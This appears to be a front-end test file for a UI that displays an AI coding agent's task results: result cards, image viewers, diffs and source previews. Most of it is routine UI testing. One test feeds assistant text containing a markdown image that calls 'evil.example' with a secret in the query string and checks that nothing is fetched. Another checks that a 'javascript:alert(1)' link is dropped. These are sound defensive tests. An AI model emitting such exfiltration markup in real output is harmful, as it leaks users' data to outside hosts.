import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react';
import { afterEach, beforeEach, expect, test, vi } from 'vitest';
import { ConversationView } from '../src/App';
import {
  type ArtifactListing,
  captionOf,
  CloudClient,
  firstSentence,
  type SourceListing,
  STEP_PREFIX,
  stepsOf,
  type TaskView,
} from '@maka-cloud/client';
import { DeliveryCard, SourcesStack } from '../src/Delivery';

beforeEach(() => {
  // jsdom has no object URLs; the code under test only needs a string it can hand to <img>.
  let n = 0;
  vi.stubGlobal(
    'URL',
    Object.assign(URL, {
      createObjectURL: () => `blob:fake/${++n}`,
      revokeObjectURL: () => {},
    }),
  );
});
afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

const PNG = new Blob([new Uint8Array([0x89, 0x50, 0x4e, 0x47])], { type: 'image/png' });

const task = (over: Partial<TaskView> = {}): TaskView => ({
  taskId: 't1',
  title: 'Fix the login loop',
  state: 'succeeded',
  createdAt: 1,
  progress: [],
  cancelRequested: false,
  pauseRequested: false,
  manifest: {
    summary: 'The login page no longer loops. Tests pass and the screenshot shows it.',
    done: [],
    notDone: [],
    confidence: 'high',
    knownIssues: [],
  },
  ...over,
});

const shot: ArtifactListing = {
  index: 0,
  name: 'login-page-after-fix.png',
  kind: 'file',
  image: true,
};
const diff: ArtifactListing = { index: 1, name: 'changes.diff', kind: 'file' };
const pull: ArtifactListing = {
  index: 2,
  name: 'pull request',
  kind: 'link',
  url: 'https://github.com/example/repo/pull/12',
};

interface Fake {
  client: CloudClient;
  reads: number[];
}
function fakeClient(
  files: Record<number, { name: string; type: string; body: string | Blob }> = {},
  sourceRoutes: (path: string) => Response | undefined = () => undefined,
): Fake {
  const reads: number[] = [];
  const fetcher: typeof fetch = async (input) => {
    const path = String(input);
    const artifact = /\/artifacts\/(\d+)$/u.exec(path);
    if (artifact) {
      const index = Number(artifact[1]);
      reads.push(index);
      const file = files[index];
      if (!file) return Response.json({}, { status: 404 });
      return new Response(file.body, {
        headers: {
          'content-type': file.type,
          'content-disposition': `attachment; filename="${file.name}"`,
        },
      });
    }
    return sourceRoutes(path) ?? Response.json({}, { status: 404 });
  };
  return { client: new CloudClient('fake', fetcher), reads };
}

test('a finished task is one card: one sentence, one picture, a caption, and the picture opens large', async () => {
  const { client } = fakeClient({
    0: { name: shot.name, type: 'image/png', body: PNG },
  });
  render(<DeliveryCard client={client} task={task()} listings={[shot]} sources={[]} />);
  const card = screen.getByRole('article', { name: 'Result: Fix the login loop' });
  // The outcome is the first sentence only.
  expect(within(card).getByText('The login page no longer loops.')).toBeTruthy();
  expect(card.textContent).not.toContain('Tests pass and the screenshot');
  expect(within(card).getByText('Login page after fix')).toBeTruthy();
  const visual = await within(card).findByRole('button', {
    name: 'Open large: Login page after fix',
  });
  expect(screen.queryByRole('dialog')).toBeNull();

  fireEvent.click(visual);
  const viewer = screen.getByRole('dialog', { name: 'Login page after fix' });
  expect(within(viewer).getByRole('button', { name: 'Close' })).toBeTruthy();
  expect(within(viewer).getByRole('button', { name: 'Collapse' })).toBeTruthy();
  expect(within(viewer).getByRole('status').textContent).toContain('Finished');
  expect(within(viewer).getByRole('img', { name: 'Login page after fix' })).toBeTruthy();
  // Focus moved into the viewer.
  expect(document.activeElement).toBe(within(viewer).getByRole('button', { name: 'Close' }));
});

test('Escape, Close and Collapse each go back and focus returns to the visual', async () => {
  const { client } = fakeClient({ 0: { name: shot.name, type: 'image/png', body: PNG } });
  render(<DeliveryCard client={client} task={task()} listings={[shot]} sources={[]} />);
  const visual = await screen.findByRole('button', { name: /Open large/u });
  for (const how of ['Escape', 'Close', 'Collapse'] as const) {
    visual.focus();
    fireEvent.click(visual);
    expect(screen.getByRole('dialog')).toBeTruthy();
    if (how === 'Escape') fireEvent.keyDown(document, { key: 'Escape' });
    else fireEvent.click(screen.getByRole('button', { name: how }));
    expect(screen.queryByRole('dialog')).toBeNull();
    expect(document.activeElement).toBe(visual);
  }
});

test('Tab stays inside the viewer', async () => {
  const { client } = fakeClient({ 0: { name: shot.name, type: 'image/png', body: PNG } });
  render(<DeliveryCard client={client} task={task()} listings={[shot]} sources={[]} />);
  fireEvent.click(await screen.findByRole('button', { name: /Open large/u }));
  const close = screen.getByRole('button', { name: 'Close' });
  const collapse = screen.getByRole('button', { name: 'Collapse' });
  collapse.focus();
  fireEvent.keyDown(collapse, { key: 'Tab' });
  expect(document.activeElement).toBe(close);
  fireEvent.keyDown(close, { key: 'Tab', shiftKey: true });
  expect(document.activeElement).toBe(collapse);
});

test('a diff opens the same way, with added and removed lines marked, and never from a picture slot', async () => {
  const { client, reads } = fakeClient({
    1: { name: 'changes.diff', type: 'text/plain', body: '+added line\n-removed line\n context\n' },
  });
  render(<DeliveryCard client={client} task={task()} listings={[diff]} sources={[]} />);
  // No picture exists, so the diff is the visual, and nothing was read until it was tapped.
  expect(reads).toEqual([]);
  fireEvent.click(screen.getByRole('button', { name: 'Open large: the changes' }));
  const viewer = await screen.findByRole('dialog', { name: 'The changes' });
  expect(reads).toEqual([1]);
  const added = within(viewer).getByText('+added line');
  const removed = within(viewer).getByText('-removed line');
  expect(added.className).toContain('add');
  expect(removed.className).toContain('del');
  expect(within(viewer).getByText('context').className).not.toMatch(/add|del/u);
});

test('a task with no picture and no diff is a sentence with no empty frame', () => {
  const { client, reads } = fakeClient();
  render(<DeliveryCard client={client} task={task()} listings={[]} sources={[]} />);
  expect(screen.queryByRole('button')).toBeNull();
  expect(screen.queryByRole('img')).toBeNull();
  expect(reads).toEqual([]);
});

test('a picture that cannot be read leaves the sentence and says so', async () => {
  const { client } = fakeClient({});
  render(<DeliveryCard client={client} task={task()} listings={[shot]} sources={[]} />);
  await screen.findByText('The picture could not be loaded.');
  expect(screen.getByText('The login page no longer loops.')).toBeTruthy();
  expect(screen.queryByRole('button')).toBeNull();
});

test('at most two actions: the pull request, then the preview; nothing that is not a public https link', () => {
  const { client } = fakeClient();
  const sources: SourceListing[] = [
    {
      index: 0,
      url: 'https://preview.example.dev/app',
      site: 'preview.example.dev',
      label: 'preview',
    },
    { index: 1, url: 'https://docs.example.dev/a', site: 'docs.example.dev', label: 'docs' },
    { index: 2, url: 'https://docs.example.dev/b', site: 'docs.example.dev', label: 'test_report' },
  ];
  const { rerender } = render(
    <DeliveryCard client={client} task={task()} listings={[pull]} sources={sources} />,
  );
  const links = screen.getAllByRole('link');
  // The arrow is an icon now, so each link's text is its words.
  expect(links.map((a) => a.textContent?.trim())).toEqual(['Open pull request', 'Open preview']);
  expect(links.map((a) => a.getAttribute('href'))).toEqual([
    'https://github.com/example/repo/pull/12',
    'https://preview.example.dev/app',
  ]);
  expect(links.every((a) => a.getAttribute('rel') === 'noreferrer noopener')).toBe(true);

  // A link that is not https, and a name the app never shows, are not offered.
  rerender(
    <DeliveryCard
      client={client}
      task={task()}
      listings={[{ ...pull, url: 'http://github.com/example/repo/pull/12' }]}
      sources={[{ ...sources[0], url: 'javascript:alert(1)' } as SourceListing]}
    />,
  );
  expect(screen.queryAllByRole('link')).toHaveLength(0);
});

test('a task that is not finished, or has no summary, has no result card', () => {
  const { client } = fakeClient();
  const { container, rerender } = render(
    <DeliveryCard client={client} task={task({ state: 'running' })} listings={[]} sources={[]} />,
  );
  expect(container.textContent).toBe('');
  rerender(
    <DeliveryCard
      client={client}
      task={task({ manifest: undefined })}
      listings={[]}
      sources={[]}
    />,
  );
  expect(container.textContent).toBe('');
});

test('the outcome never shows a vendor or model name', () => {
  const { client } = fakeClient();
  render(
    <DeliveryCard
      client={client}
      task={task({
        manifest: {
          summary: 'Claude Code fixed it with gpt-5.',
          done: [],
          notDone: [],
          confidence: 'high',
          knownIssues: [],
        },
      })}
      listings={[]}
      sources={[]}
    />,
  );
  expect(document.body.textContent).not.toMatch(/Claude|GPT|OpenAI/iu);
});

const source = (index: number, label: SourceListing['label'], site = `site${index}.example`) =>
  ({ index, label, site, url: `https://${site}/page` }) satisfies SourceListing;

function previewRoutes(
  previews: Record<number, { title?: string; image: boolean }>,
  images: Record<number, Blob> = {},
) {
  const asked: string[] = [];
  const route = (path: string): Response | undefined => {
    asked.push(path);
    const preview = /\/sources\/(\d+)\/preview$/u.exec(path);
    if (preview) {
      const found = previews[Number(preview[1])];
      return found ? Response.json({ site: 'x', ...found }) : Response.json({}, { status: 404 });
    }
    const image = /\/sources\/(\d+)\/image$/u.exec(path);
    if (image) {
      const bytes = images[Number(image[1])];
      return bytes ? new Response(bytes, { headers: { 'content-type': 'image/png' } }) : undefined;
    }
    return undefined;
  };
  return { route, asked };
}

test('a source card has the preview image, a two-line title and a site and reason line', async () => {
  const { route } = previewRoutes(
    { 0: { title: 'Fix login loops with cookies', image: true } },
    { 0: PNG },
  );
  const { client } = fakeClient({}, route);
  render(
    <SourcesStack client={client} taskId="t1" sources={[source(0, 'docs', 'docs.example.dev')]} />,
  );
  const card = screen.getByRole('link');
  await screen.findByText('Fix login loops with cookies');
  expect(card.getAttribute('href')).toBe('https://docs.example.dev/page');
  expect(card.textContent).toContain('docs.example.dev · the docs');
  await waitFor(() => expect(card.querySelector('img')?.getAttribute('src')).toMatch(/^blob:/u));
  // The site's own address is never an image source: pictures only come from the server's route.
  expect(card.querySelector('img')?.getAttribute('src')).not.toContain('example.dev');
});

test('a page with no preview image is a plain card with the site’s initial', async () => {
  const { route } = previewRoutes({ 0: { title: 'Zebra notes', image: false } });
  const { client } = fakeClient({}, route);
  render(
    <SourcesStack client={client} taskId="t1" sources={[source(0, 'source', 'zebra.example')]} />,
  );
  await screen.findByText('Zebra notes');
  const card = screen.getByRole('link');
  expect(card.querySelector('img')).toBeNull();
  expect(card.querySelector('.source-image')?.textContent).toBe('Z');
});

test('a page the server cannot preview is still a card, titled by its site', async () => {
  const { route } = previewRoutes({});
  const { client } = fakeClient({}, route);
  render(
    <SourcesStack client={client} taskId="t1" sources={[source(0, 'source', 'plain.example')]} />,
  );
  const card = await screen.findByRole('link');
  await waitFor(() => expect(card.textContent).toContain('plain.example'));
  expect(card.querySelector('.source-image')?.textContent).toBe('P');
});

test('three cards are fanned -5, 0 and +4 degrees with the middle one on top', () => {
  const { route } = previewRoutes({});
  const { client } = fakeClient({}, route);
  render(
    <SourcesStack
      client={client}
      taskId="t1"
      sources={[source(0, 'pull_request'), source(1, 'preview'), source(2, 'test_report')]}
    />,
  );
  const cards = screen.getAllByRole('link');
  expect(cards.map((c) => c.style.getPropertyValue('--tilt'))).toEqual(['-5deg', '0deg', '4deg']);
  expect(cards.map((c) => c.style.zIndex)).toEqual(['1', '2', '1']);
});

test('no sources, no stack, and nothing is fetched', () => {
  const { route, asked } = previewRoutes({});
  const { client } = fakeClient({}, route);
  const { container } = render(<SourcesStack client={client} taskId="t1" sources={[]} />);
  expect(container.textContent).toBe('');
  expect(asked).toEqual([]);
});

test('step line: the agent’s own step comes first and the steps open behind it', () => {
  expect(stepsOf([])).toEqual({ steps: [] });
  expect(stepsOf(['Working'])).toEqual({ current: 'Working', steps: ['Working'] });
  expect(
    stepsOf([`${STEP_PREFIX}Read the failing test`, 'Working', `${STEP_PREFIX}Fix the loop`]),
  ).toEqual({
    current: 'Fix the loop',
    steps: ['Read the failing test', 'Working', 'Fix the loop'],
  });
  // A later plain note does not replace the agent's own line.
  expect(stepsOf([`${STEP_PREFIX}Fix the loop`, 'Working']).current).toBe('Fix the loop');
});

test('outcome and caption helpers', () => {
  expect(firstSentence('The login page no longer loops. Tests pass.')).toBe(
    'The login page no longer loops.',
  );
  expect(firstSentence('Done.')).toBe('Done.');
  expect(firstSentence('v1.2 ships today. More text.')).toBe('v1.2 ships today.');
  expect(firstSentence('a '.repeat(200)).length).toBeLessThanOrEqual(160);
  expect(firstSentence('a '.repeat(200)).endsWith('…')).toBe(true);
  expect(captionOf('login-page_after fix.png')).toBe('Login page after fix');
  expect(captionOf('x'.repeat(100)).length).toBeLessThanOrEqual(60);
  expect(captionOf('.png')).toBe('');
});

// The chat itself: a running task's one updating line, and model text that names a picture.
type Frame = { id: number; kind: string; data: Record<string, unknown> };
function chatApi(frames: Frame[]) {
  const calls: string[] = [];
  const fetcher = (async (input: RequestInfo | URL, init?: RequestInit) => {
    const path = String(input);
    if (path.startsWith('/v1/events')) {
      return new Response(
        new ReadableStream({
          start(controller) {
            controller.enqueue(
              new TextEncoder().encode(
                frames
                  .map((f) => `id: ${f.id}\nevent: ${f.kind}\ndata: ${JSON.stringify(f.data)}\n\n`)
                  .join(''),
              ),
            );
            init?.signal?.addEventListener('abort', () => controller.close(), { once: true });
          },
        }),
        { headers: { 'content-type': 'text/event-stream' } },
      );
    }
    calls.push(path);
    if (path.includes('/tasks?')) return Response.json({ tasks: [] });
    if (path.endsWith('/sources')) return Response.json({ sources: [], total: 0 });
    return Response.json({});
  }) as typeof fetch;
  return { fetcher, calls };
}
const conversation = { conversationId: 'cnv_1', title: 'Launch', createdAt: 0 };
const feed = (id: number, event: Record<string, unknown>): Frame => ({
  id,
  kind: 'task.event',
  data: { conversationId: 'cnv_1', seq: id, at: id, event },
});

test('a running task shows its latest own step as one line and opens to the steps', async () => {
  const api = chatApi([
    feed(1, { type: 'task_created', taskId: 't1', sessionId: 's', title: 'Fix it', mode: 'async' }),
    feed(2, { type: 'task_started', taskId: 't1' }),
    feed(3, { type: 'task_progress', taskId: 't1', note: `${STEP_PREFIX}Read the failing test` }),
    feed(4, { type: 'task_progress', taskId: 't1', note: `${STEP_PREFIX}Fix the redirect loop` }),
  ]);
  render(
    <ConversationView client={new CloudClient('fake', api.fetcher)} conversation={conversation} />,
  );
  const article = await screen.findByRole('article', { name: 'Fix it' });
  await waitFor(() =>
    expect(article.querySelector('summary')?.textContent).toContain('Fix the redirect loop'),
  );
  const details = article.querySelector('details') as HTMLDetailsElement;
  expect(within(details).getByText('Read the failing test')).toBeTruthy();
  // The steps are collapsed until the person opens them.
  expect(details.open).toBe(false);
  // The task asked the server which pages it opened, and only that: no preview was fetched.
  await waitFor(() => expect(api.calls.some((c) => c.endsWith('/tasks/t1/sources'))).toBe(true));
  expect(api.calls.some((c) => c.includes('/preview') || c.includes('/image'))).toBe(false);
});

test('a picture named in model text is text: nothing is loaded and nothing is asked of that address', async () => {
  const api = chatApi([
    {
      id: 1,
      kind: 'message.posted',
      data: {
        conversationId: 'cnv_1',
        messageId: 'm1',
        role: 'assistant',
        text: 'Here is the chart ![chart](https://evil.example/pixel.png?d=secret)',
      },
    },
  ]);
  const { container } = render(
    <ConversationView client={new CloudClient('fake', api.fetcher)} conversation={conversation} />,
  );
  await screen.findByText(/Here is the chart/u);
  expect(container.querySelector('img')).toBeNull();
  expect(api.calls.some((c) => c.includes('evil.example'))).toBe(false);
  // It is shown as the text it is.
  expect(container.textContent).toContain('![chart](https://evil.example/pixel.png?d=secret)');
});

test('screenshots at several sizes are shown side by side, widest first, each loaded once and opening large', async () => {
  const views: ArtifactListing[] = [
    { index: 0, name: 'home-phone.png', kind: 'file', image: true },
    { index: 1, name: 'home-desktop.png', kind: 'file', image: true },
  ];
  const { client, reads } = fakeClient({
    0: { name: 'home-phone.png', type: 'image/png', body: PNG },
    1: { name: 'home-desktop.png', type: 'image/png', body: PNG },
  });
  render(<DeliveryCard client={client} task={task()} listings={views} sources={[]} />);
  const group = screen.getByRole('group', { name: 'Desktop and phone' });
  const frames = await within(group).findAllByRole('button', { name: /^Open large: / });
  expect(frames.map((frame) => frame.getAttribute('aria-label'))).toEqual([
    'Open large: Desktop',
    'Open large: Phone',
  ]);
  await waitFor(() =>
    expect(frames.every((frame) => !(frame as HTMLButtonElement).disabled)).toBe(true),
  );
  expect([...reads].sort()).toEqual([0, 1]);
  fireEvent.click(frames[1] as HTMLElement);
  expect(screen.getByRole('dialog', { name: 'Phone' })).toBeTruthy();
});
